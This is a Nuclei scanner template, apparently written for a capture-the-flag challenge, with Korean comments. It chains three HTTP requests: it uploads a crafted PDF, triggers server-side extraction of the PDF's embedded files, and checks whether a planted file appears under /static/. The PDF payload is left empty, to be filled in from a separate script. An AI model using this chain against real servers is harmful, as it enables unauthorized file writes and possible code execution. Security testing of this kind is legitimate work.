id: pdf-arbitrary-file-write

info:
  name: PDF Embedded File Overwrite (Static File Check)
  author: jebeen
  severity: critical
  description: |
    Detects Arbitrary File Write vulnerability via PDF embedding.
    Attempts to write a text file to the /static/ directory and verify its existence.
  tags: ctf, file-upload, rce, file-write

http:
  - raw:
      # [Step 1] PDF Upload
      # 아래 body 부분에 Python 스크립트로 생성한 PDF의 Hex 값을 넣으세요.
      - |
        POST /upload HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=---------------------------NucleiBoundary

        -----------------------------NucleiBoundary
        Content-Disposition: form-data; name="file"; filename="detect.pdf"
        Content-Type: application/pdf

        {{hex_decode('')}}
        -----------------------------NucleiBoundary--

      # [Step 2] Trigger Process (Extract Files)
      # 1단계 응답에서 파일명을 추출하여 처리 요청을 보냅니다.
      - |
        POST /process/{{saved_pdf}} HTTP/1.1
        Host: {{Hostname}}

      # [Step 3] Verification
      # 우리가 심은 파일(/static/nuclei.txt)이 존재하는지 확인합니다.
      - |
        GET /static/nuclei.txt HTTP/1.1
        Host: {{Hostname}}

    # [변수 추출] 1단계 응답에서 저장된 파일명(saved_as)을 추출
    extractors:
      - type: json
        part: body
        name: saved_pdf
        json:
          - '.saved_as'
        internal: true # 다음 요청에서만 사용

    # [검증 매처]
    matchers:
      - type: word
        part: body
        words:
          - "nuclei_verification_success"  # 우리가 파일에 적은 내용